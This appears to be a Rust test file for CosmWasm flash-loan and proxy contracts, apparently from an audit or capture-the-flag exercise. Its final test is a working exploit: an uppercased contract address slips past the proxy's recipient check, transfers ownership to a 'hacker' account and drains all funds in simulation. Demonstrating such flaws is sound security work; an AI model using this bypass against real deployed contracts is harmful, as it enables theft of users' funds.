#[cfg(test)]
pub mod tests {
    use crate::contract::DENOM;
    use crate::ContractError as ProxyContractError;
    use common::flash_loan::{
        Config as FlashLoanConfig, ExecuteMsg as FlashLoanExecuteMsg,
        InstantiateMsg as FlashLoanInstantiateMsg, QueryMsg as FlashLoanQueryMsg,
    };
    use common::mock_arb::{
        ExecuteMsg as MockArbExecuteMsg, InstantiateMsg as MockArbInstantiateMsg,
    };
    use common::proxy::{ExecuteMsg, InstantiateMsg};
    use cosmwasm_std::{coin, to_binary, Addr, Empty, Uint128};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};
    use flash_loan::ContractError as FlashLoanContractError;

    pub fn proxy_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub fn flash_loan_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            flash_loan::contract::execute,
            flash_loan::contract::instantiate,
            flash_loan::contract::query,
        );
        Box::new(contract)
    }

    pub fn mock_arb_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            mock_arb::contract::execute,
            mock_arb::contract::instantiate,
            mock_arb::contract::query,
        );
        Box::new(contract)
    }

    pub const USER: &str = "user";
    pub const ADMIN: &str = "admin";

    pub fn proper_instantiate() -> (App, Addr, Addr, Addr) {
        let mut app = App::default();

        let cw_template_id = app.store_code(proxy_contract());
        let flash_loan_id = app.store_code(flash_loan_contract());
        let mock_arb_id = app.store_code(mock_arb_contract());

        // init flash loan contract
        let msg = FlashLoanInstantiateMsg {};
        let flash_loan_contract = app
            .instantiate_contract(
                flash_loan_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "flash_loan",
                None,
            )
            .unwrap();

        // init proxy contract
        let msg = InstantiateMsg {
            flash_loan_addr: flash_loan_contract.to_string(),
        };
        let proxy_contract = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "proxy",
                None,
            )
            .unwrap();

        // init mock arb contract
        let msg = MockArbInstantiateMsg {};
        let mock_arb_contract = app
            .instantiate_contract(
                mock_arb_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "mock_arb",
                None,
            )
            .unwrap();

        // mint funds to flash loan contract
        app = mint_tokens(app, flash_loan_contract.to_string(), Uint128::new(10_000));

        // set proxy contract
        app.execute_contract(
            Addr::unchecked(ADMIN),
            flash_loan_contract.clone(),
            &FlashLoanExecuteMsg::SetProxyAddr {
                proxy_addr: proxy_contract.to_string(),
            },
            &[],
        )
        .unwrap();

        (app, proxy_contract, flash_loan_contract, mock_arb_contract)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient,
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn basic_flow() {
        let (mut app, proxy_contract, flash_loan_contract, mock_arb_contract) =
            proper_instantiate();

        // prepare arb msg
        let arb_msg = to_binary(&MockArbExecuteMsg::Arbitrage {
            recipient: flash_loan_contract.clone(),
        })
        .unwrap();

        // cannot call flash loan address from proxy
        app.execute_contract(
            Addr::unchecked(ADMIN),
            proxy_contract.clone(),
            &ExecuteMsg::RequestFlashLoan {
                recipient: flash_loan_contract.clone(),
                msg: arb_msg.clone(),
            },
            &[],
        )
        .unwrap_err();

        // try perform flash loan
        app.execute_contract(
            Addr::unchecked(ADMIN),
            proxy_contract,
            &ExecuteMsg::RequestFlashLoan {
                recipient: mock_arb_contract,
                msg: arb_msg,
            },
            &[],
        )
        .unwrap();

        // funds are sent back to flash loan contract
        let balance = app
            .wrap()
            .query_balance(flash_loan_contract.to_string(), DENOM)
            .unwrap();
        assert_eq!(balance.amount, Uint128::new(10_000));
    }

    // bao: Some playing around with negative paths
    // This recursive call should trigger a OngoingFlashLoan error
    #[test]
    fn recursive_proxy_call() {
        // base scenario has 10_000 minted to flash loan contract
        let (mut app, proxy_contract, flash_loan_contract, mock_arb_contract) =
            proper_instantiate();

        // prepare proxy request loan message
        let arb_msg = to_binary(&MockArbExecuteMsg::Arbitrage {
            recipient: flash_loan_contract.clone(),
        })
        .unwrap();
        // recursive request loan
        let recursive_msg = to_binary(&ExecuteMsg::RequestFlashLoan {
            recipient: mock_arb_contract.clone(),
            msg: arb_msg.clone(),
        })
        .unwrap();
        // request flash loan
        let err = app
            .execute_contract(
                Addr::unchecked(ADMIN),
                proxy_contract.clone(),
                &ExecuteMsg::RequestFlashLoan {
                    recipient: proxy_contract.clone(),
                    msg: recursive_msg.clone(),
                },
                &[],
            )
            .unwrap_err()
            .downcast()
            .unwrap();
        // check error
        assert!(matches!(err, FlashLoanContractError::OngoingFlashLoan {}));
    }

    const HACKER: &str = "hacker";

    // bao: Cannot call flash loan contract from proxy handler
    #[test]
    fn flash_loan_from_proxy_handler() {
        let (mut app, proxy_contract, flash_loan_contract, _) = proper_instantiate();

        // prepare arb msg
        let transfer_owner_msg = to_binary(&FlashLoanExecuteMsg::TransferOwner {
            new_owner: Addr::unchecked(HACKER),
        })
        .unwrap();

        // cannot call flash loan address from proxy
        let err = app
            .execute_contract(
                Addr::unchecked(ADMIN),
                proxy_contract.clone(),
                &ExecuteMsg::RequestFlashLoan {
                    recipient: flash_loan_contract.clone(),
                    msg: transfer_owner_msg.clone(),
                },
                &[],
            )
            .unwrap_err()
            .downcast()
            .unwrap();
        assert!(matches!(err, ProxyContractError::CallToFlashLoan {}));
    }

    #[test]
    fn exploit_bad_addr_input() {
        let (mut app, proxy_contract, flash_loan_contract, _) = proper_instantiate();

        // EXPLOIT: user can pass in uppercased flash loan address
        // This will fail the `recipient == flash_loan_addr` check
        // but will allow the proxy to call the flash loan contract directly
        let flash_recipient = Addr::unchecked(flash_loan_contract.to_string().to_ascii_uppercase());
        app.execute_contract(
            Addr::unchecked(ADMIN),
            proxy_contract.clone(),
            &ExecuteMsg::RequestFlashLoan {
                recipient: flash_recipient,
                msg: to_binary(&FlashLoanExecuteMsg::TransferOwner {
                    new_owner: Addr::unchecked(HACKER),
                })
                .unwrap(),
            },
            &[],
        )
        .unwrap();
        // Flash loan is now owned by hacker :(
        let config: FlashLoanConfig = app
            .wrap()
            .query_wasm_smart(
                flash_loan_contract.to_string(),
                &FlashLoanQueryMsg::Config {},
            )
            .unwrap();
        assert_eq!(config.owner, Addr::unchecked(HACKER));
        // Can drain funds
        app.execute_contract(
            Addr::unchecked(HACKER),
            flash_loan_contract.clone(),
            &FlashLoanExecuteMsg::WithdrawFunds {
                recipient: Addr::unchecked(HACKER),
            },
            &[],
        )
        .unwrap();
        // Funds are drained
        let balance = app
            .wrap()
            .query_balance(flash_loan_contract.to_string(), DENOM)
            .unwrap();
        assert_eq!(balance.amount, Uint128::zero());
        // Hacker owns 10_000 tokens
        let balance = app
            .wrap()
            .query_balance(Addr::unchecked(HACKER), DENOM)
            .unwrap();
        assert_eq!(balance.amount, Uint128::new(10_000));
    }
}
